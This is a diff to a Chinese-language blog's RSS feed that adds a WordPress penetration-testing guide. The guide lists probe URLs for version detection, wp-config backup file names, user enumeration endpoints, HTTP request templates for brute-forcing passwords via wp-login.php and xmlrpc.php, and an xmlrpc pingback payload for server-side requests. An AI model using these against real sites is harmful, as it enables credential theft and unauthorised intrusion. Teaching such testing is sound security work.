@@ -1,4 +1,125 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>所有文章 - n0tr00t's blog</title><link>https://n0tr00t.eu.org/posts/</link><description>所有文章 | n0tr00t's blog</description><generator>Hugo -- gohugo.io</generator><language>zh</language><managingEditor>blog@n0tr00t.eu.org (n0tr00t)</managingEditor><webMaster>blog@n0tr00t.eu.org (n0tr00t)</webMaster><copyright>CC BY-NC-SA 4.0</copyright><lastBuildDate>Mon, 05 Sep 2022 08:57:40 +0000</lastBuildDate><atom:link href="https://n0tr00t.eu.org/posts/" rel="self" type="application/rss+xml"/><item><title>记录F-Droid软件源</title><link>https://n0tr00t.eu.org/posts/f-droid-mirrors/</link><pubDate>Mon, 05 Sep 2022 08:57:40 +0000</pubDate><author>n0tr00t</author><guid>https://n0tr00t.eu.org/posts/f-droid-mirrors/</guid><description><![CDATA[<h2 id="f-droid-archive">F-Droid Archive</h2>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>所有文章 - n0tr00t's blog</title><link>https://n0tr00t.eu.org/posts/</link><description>所有文章 | n0tr00t's blog</description><generator>Hugo -- gohugo.io</generator><language>zh</language><managingEditor>blog@n0tr00t.eu.org (n0tr00t)</managingEditor><webMaster>blog@n0tr00t.eu.org (n0tr00t)</webMaster><copyright>CC BY-NC-SA 4.0</copyright><lastBuildDate>Thu, 15 Sep 2022 08:00:18 +0000</lastBuildDate><atom:link href="https://n0tr00t.eu.org/posts/" rel="self" type="application/rss+xml"/><item><title>Wordpress网站渗透方法指南</title><link>https://n0tr00t.eu.org/posts/wordpress%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%96%B9%E6%B3%95%E6%8C%87%E5%8D%97/</link><pubDate>Thu, 15 Sep 2022 08:00:18 +0000</pubDate><author>n0tr00t</author><guid>https://n0tr00t.eu.org/posts/wordpress%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%96%B9%E6%B3%95%E6%8C%87%E5%8D%97/</guid><description><![CDATA[<p>原作者：HACK学习
+n0tr00t进行补充</p>
+<blockquote>
+<p>如果您遇到使用 WordPress 的网站，您会怎么做，渗透思路和安全检测思路？</p>
+</blockquote>
+<h2 id="如何挖掘wordpress网站的漏洞">如何挖掘Wordpress网站的漏洞</h2>
+<p>如果您访问<a href="https://target.com" target="_blank" rel="noopener noreffer">https://target.com</a>
+并查看源代码，您将看到来自 WordPress 的主题和插件的链接。</p>
+<p>或者你可以访问<a href="https://target.com/wp-login.php" target="_blank" rel="noopener noreffer">https://target.com/wp-login.php</a>
+，它是 WordPress 登录管理页面</p>
+<p>通过查看核心、插件和主题版本找到相关的CVE</p>
+<h2 id="如何找到wordpress版本">如何找到wordpress版本</h2>
+<pre tabindex="0"><code>https://target.com/feed
+https://target.com/?feed=rss2
+</code></pre><h2 id="如何找到插件版本">如何找到插件版本</h2>
+<pre tabindex="0"><code>https://target.com/wp-content/plugins/PLUGINNAME/.git/config
+https://target.com/wp-content/plugins/PLUGINNAME/changelog
+https://target.com/wp-content/plugins/PLUGINNAME/changelog.txt
+https://target.com/wp-content/plugins/PLUGINNAME/changelog.md
+https://target.com/wp-content/plugins/PLUGINNAME/changelog.rst
+https://target.com/wp-content/plugins/PLUGINNAME/version
+https://target.com/wp-content/plugins/PLUGINNAME/readme
+https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
+https://target.com/wp-content/plugins/PLUGINNAME/readme.md
+https://target.com/wp-content/plugins/PLUGINNAME/readme.rst
+https://target.com/wp-content/plugins/PLUGINNAME/readme.pdf
+https://target.com/wp-content/plugins/PLUGINNAME/readme.doc
+https://target.com/wp-content/plugins/PLUGINNAME/readme.docx
+https://target.com/wp-content/plugins/PLUGINNAME/readme.ppt
+https://target.com/wp-content/plugins/PLUGINNAME/readme.pptx
+https://target.com/wp-content/plugins/PLUGINNAME/readme.MD
+https://target.com/wp-content/plugins/PLUGINNAME/readme.RST
+https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
+https://target.com/wp-content/plugins/PLUGINNAME/readme.PDF
+https://target.com/wp-content/plugins/PLUGINNAME/readme.DOC
+https://target.com/wp-content/plugins/PLUGINNAME/readme.DOCX
+https://target.com/wp-content/plugins/PLUGINNAME/readme.PPT
+https://target.com/wp-content/plugins/PLUGINNAME/readme.PPTX
+https://target.com/wp-content/plugins/PLUGINNAME/VERSION
+https://target.com/wp-content/plugins/PLUGINNAME/README
+https://target.com/wp-content/plugins/PLUGINNAME/README.txt
+https://target.com/wp-content/plugins/PLUGINNAME/README.md
+https://target.com/wp-content/plugins/PLUGINNAME/README.rst
+https://target.com/wp-content/plugins/PLUGINNAME/README.pdf
+https://target.com/wp-content/plugins/PLUGINNAME/README.doc
+https://target.com/wp-content/plugins/PLUGINNAME/README.docx
+https://target.com/wp-content/plugins/PLUGINNAME/README.ppt
+https://target.com/wp-content/plugins/PLUGINNAME/README.pptx
+https://target.com/wp-content/plugins/PLUGINNAME/README.MD
+https://target.com/wp-content/plugins/PLUGINNAME/README.RST
+https://target.com/wp-content/plugins/PLUGINNAME/README.TXT
+https://target.com/wp-content/plugins/PLUGINNAME/README.PDF
+https://target.com/wp-content/plugins/PLUGINNAME/README.DOC
+https://target.com/wp-content/plugins/PLUGINNAME/README.DOCX
+https://target.com/wp-content/plugins/PLUGINNAME/README.PPT
+https://target.com/wp-content/plugins/PLUGINNAME/README.PPTX
+</code></pre><h2 id="如何找到主题版本">如何找到主题版本</h2>
+<pre tabindex="0"><code>https://target.com/wp-content/themes/THEMENAME/style.css
+https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)
+</code></pre><p>如果您发现过时的核心/插件/主题，请在<a href="https://wpscan.com" target="_blank" rel="noopener noreffer">https://wpscan.com</a>
+找到漏洞利用</p>
+<h2 id="查找日志文件">查找日志文件</h2>
+<pre tabindex="0"><code>http://target.com/wp-content/debug.log
+</code></pre><h2 id="查找备份文件-wp-config">查找备份文件 wp-config</h2>
+<pre tabindex="0"><code>http://target.com/.wp-config.php.swp
+http://target.com/wp-config.inc
+http://target.com/wp-config.old
+http://target.com/wp-config.txt
+http://target.com/wp-config.html
+http://target.com/wp-config.php.bak
+http://target.com/wp-config.php.dist
+http://target.com/wp-config.php.inc
+http://target.com/wp-config.php.old
+http://target.com/wp-config.php.save
+http://target.com/wp-config.php.swp
+http://target.com/wp-config.php.txt
+http://target.com/wp-config.php.7z
+http://target.com/wp-config.php.tar
+http://target.com/wp-config.php.gz
+http://target.com/wp-config.php.zip
+http://target.com/wp-config.php.html
+http://target.com/wp-config.php~
+</code></pre><h2 id="获取网站上的用户名">获取网站上的用户名</h2>
+<pre tabindex="0"><code>http://target.com/?author=1
+</code></pre><p>或者</p>
+<pre tabindex="0"><code>http://target.com/wp-json/wp/v2/users
+http://target.com/?rest_route=/wp/v2/users
+</code></pre><h2 id="爆破后台账号密码">爆破后台账号密码</h2>
+<pre tabindex="0"><code>POST /wp-login.php HTTP/1.1
+Host: target.com
+
+log=admin&amp;pwd=BRUTEFORCE_IN_HERE&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&amp;testcookie=1
+</code></pre><p>或者</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">POST /xmlrpc.php HTTP/1.1
+Host: target.com
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#f92672">&lt;methodCall&gt;</span>
+<span style="color:#f92672">&lt;methodName&gt;</span>wp.getUsersBlogs<span style="color:#f92672">&lt;/methodName&gt;</span>
+<span style="color:#f92672">&lt;params&gt;</span>
+<span style="color:#f92672">&lt;param&gt;&lt;value&gt;</span>admin<span style="color:#f92672">&lt;/value&gt;&lt;/param&gt;</span>
+<span style="color:#f92672">&lt;param&gt;&lt;value&gt;</span>BRUTEFORCE_IN_HERE<span style="color:#f92672">&lt;/value&gt;&lt;/param&gt;</span>
+<span style="color:#f92672">&lt;/params&gt;</span>
+<span style="color:#f92672">&lt;/methodCall&gt;</span>
+</code></pre></div><h2 id="wordpress-中的-xspa">Wordpress 中的 XSPA</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">POST /xmlrpc.php HTTP/1.1
+Host: target.com
+
+<span style="color:#f92672">&lt;methodCall&gt;</span>
+<span style="color:#f92672">&lt;methodName&gt;</span>pingback.ping<span style="color:#f92672">&lt;/methodName&gt;</span>
+<span style="color:#f92672">&lt;params&gt;&lt;param&gt;</span>
+<span style="color:#f92672">&lt;value&gt;&lt;string&gt;</span>http://yourip:port<span style="color:#f92672">&lt;/string&gt;&lt;/value&gt;</span>
+<span style="color:#f92672">&lt;/param&gt;&lt;param&gt;</span>
+<span style="color:#f92672">&lt;value&gt;</span>
+<span style="color:#f92672">&lt;string&gt;</span>https://target.com&gt;<span style="color:#f92672">&lt;/string&gt;</span>
+<span style="color:#f92672">&lt;/value&gt;</span>
+<span style="color:#f92672">&lt;/param&gt;&lt;/params&gt;</span>
+<span style="color:#f92672">&lt;/methodCall&gt;</span>
+</code></pre></div><h2 id="注册启用">注册启用</h2>
+<p><a href="http://target.com/wp-login.php?action=register" target="_blank" rel="noopener noreffer">http://target.com/wp-login.php?action=register</a>
+</p>
+]]></description></item><item><title>记录F-Droid软件源</title><link>https://n0tr00t.eu.org/posts/f-droid-mirrors/</link><pubDate>Mon, 05 Sep 2022 08:57:40 +0000</pubDate><author>n0tr00t</author><guid>https://n0tr00t.eu.org/posts/f-droid-mirrors/</guid><description><![CDATA[<h2 id="f-droid-archive">F-Droid Archive</h2>
 <blockquote>
 <p>The archive of the official F-Droid Free Software repository.  Apps here are old and can contain known vulnerabilities and security issues!</p>
 </blockquote>
